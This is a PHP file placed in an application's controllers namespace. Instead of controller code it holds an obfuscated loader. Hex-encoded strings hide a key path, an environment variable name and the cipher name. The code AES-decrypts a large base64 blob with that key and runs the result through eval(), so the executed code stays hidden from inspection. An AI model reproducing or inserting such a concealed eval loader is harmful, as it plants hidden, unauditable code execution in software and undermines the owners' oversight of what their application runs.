<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TCg44EzOoeE5hln2Uf1xlA==');

$c=base64_decode(

'bS2M+W+scyt/4aWpa0DX5m2NyPsJm4BMIT/azPKpjR4OLtyZ2+N2YtwbhB0Zvj7OkRRIieEPsYSE' .
'+6nRV6FIOjVolpwF9bfJmwV+8dvYJGle0fIdpPwdBURq+7cBP6wKsEUvyGWZgQXouBpvkn4dsMil' .
'UlECVaVbEGCAoqL823u/cjoeAWlROz6kFVTlONea4eb/vTR54kqUH8tilTPQlLx6GB81dc8YSRqh' .
'9EkujEf4cLlNDto5/YlznyyaMNRsAQft7OZL4/SG/jvSYYbcPe0PrjZ/sP2RgaJssNy852LQKsf9' .
'J0/l6T+xoYsDTsTfeh5MrCdxxAjjTKj8OxrNVxo2LZq+1MGlYQLzqf+e2OiFazDHZq45g1I8EATa' .
'1vG4kuUOq8iF8qO/xne1RKX9mNJd60axF1QIh7WCPGjzpPU5ysDjZrDgh7fjyqi0jqTds7OX/pAX' .
'Lscy9JUG7WODfe56w6LaRG3BMyeUrPLTAhwdNbqayJ7Eizpg+3UTu1pb7R53kcWr8JjgEVx2YHU7' .
'5Y9EZvceFzPmV8o+nLOe96ZXwHQiZSMmzcz7oUhbz0NcCfmIPoSavFtZwLF+iWmOU8UN0HPE86wS' .
'cw6ivJFvexfByNC7dOOjDGM1CUQAvW3J31WNLcNa8jsd3vdJ2/eu93LCyJ0MRBQK/dDJD1KRizPL' .
'1xqDJHE4LUC7uhdMXCKeI7ES/uP9DNFg1dRskTuJ5bdb+6n3kQCB/+lj+X63dF4TWh/sGRShYTHI' .
'ER6MdWjtv5MtYHURUF+G2D24mBfpm6qvR76G0NkQovoaVhMMnebFMP7eX+OXaynal5VTwfGXo8X9' .
'OBrcAjt58I9UCWa+YTbZJ3RBae6NmfrhAACgVDgDWd9at/ukg+4VaSaph359XSB1j/IEuPXJWttF' .
'ZAwYtkbJ/xLp9TTUvb0eQerSox6NKROm3+9GQPUxuM+3QBwSIJvA809JY8UXnWzALQ5KZnfY5hQI' .
'n6/xRkoFzBXjOBpj5cHlEKIU5BAKXE/AQ7egKT8I1SisY2iL0xi6oYxr+5V7U3BUK/8ufc56SdXl' .
'8FZYYdYBq43fgalD6fzY8UCABjFSyhlg1KgIKNA0ibbN5xSzE+YEb41r9ZcROwPdqE49ecN1hssX' .
'Ca1/u+a3AosQR6jvWDFJ+dQ0IwSDRRlIlu0iIug1E4jlbzXELFFDRIHKfEaxo9r/xGLZRJ2VT5EE' .
'Vmmcx7hYCG2GnI5DSYwIerDu7mlydTUAxn5KxgAfVhEIoglBCmT1smvI4Cav4ma+Fd+ccd+CVLgB' .
'0/FW4yqQBSdShZXWJBqkvpK51BokxFc5b3epioUy9dF8uycKATCrhDQ9cIXYTMF20jMX4ACErIvf' .
'myvLOID8V0srHjNG1v68Z6IE0n6GRhrZbTo6Dpu+jsvjjCA2sq3ojb0jvk1RrWZ/vzHF5jCcocGH' .
'9vMEyw6ElQvOdcweJ0pOxxnaQMhrIexs387u53rLC3yAfND/mnV8s4wY0M4ByQgk0g3NbA0hKAUQ' .
'gQvAmepcDio0hK+OXSKhR/LY+LF+chcvOLolnV7ko5khL9oPfJ/tRj2WpUT2iJP+VZvkUVr/ziwe' .
'vle4lh8DbbX2WNyXqRkobgo3j2hvdyS+LFaoogDUTczpIcrvKiwFEc6Eh6Kc1Lj0AX8KeZQ65ukA' .
'GVZRikBVZ3WsJfFz9aHsBkmKg3SZ7p/XEWofudKoBUUHiCcxOD614oZqn/Gg9wcK+VLCwkspmnih' .
'Q5GB4bo5f7SiwJhnkmwYpCRAoV8rbH5wc0fmqzt7Ii1qXa45zRGjh0AOY43FWPnp+QhAmZErNiQI' .
'LncZrN91zwUPkfTGO8J/ho4P4NLAaOn/d2If+DBs0ODH4o8noX6h+V/LMSghdeS9H5/cHrMYB6It' .
'v99ZehjMcCH47HQ6c+w7foB2lvpuQjxvY5rNlHheEw2HkhiimR964TkiGUvPc+UhuTNRvsiHIyYi' .
'+m/bRPlCQKPH83rytJERTFZ29mcWR2onq8Fgw3XxnlUF2q49Zs0qlXziZcIYRR3k3gcTrmTsLKYL' .
'+hNXP4FwV7IC4PBApB6bphm+7V+9xTcNNkiARr+9aTTG/AQT3iyijBbROLYbOQU0wzJUze5DFa/Q' .
'/h5tMe+YOj3Avc9WwemrgLEUIC7Y25aoOOcm/C2HBcg21o3gzKnUwbPFlAuKn+FzD7FrRqeBeKlq' .
'do+KLhLuSxMU4zgY70Ld4wsy8YtJ1mWSVWl9fIb5N3zOsovIqooYGNV/kvvz9mS2caOQE2LQO3Xl' .
'q4uN+hr6tOOLEstVISbXu/JcRGvmoeGb4nXosGw8HJZmQFuxeTV0W9Jj1x83hHaEwu7NoGBYWJ9Z' .
'+dVKCQ9uf/m5IvcMyAqGwXTMZvCKWykUhu8vuCliK8jpSoZewunB+ZdUmNJX4KmeA5M28QpwYvwe' .
'usha4jJIA0Maa+PjEXZSVP6TXQr/JsnwNDA2dvm1+pjscLpq6DTmBkdfMqIwUlL7MJuG0/6IUXvv' .
'W2W2kOLkXQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

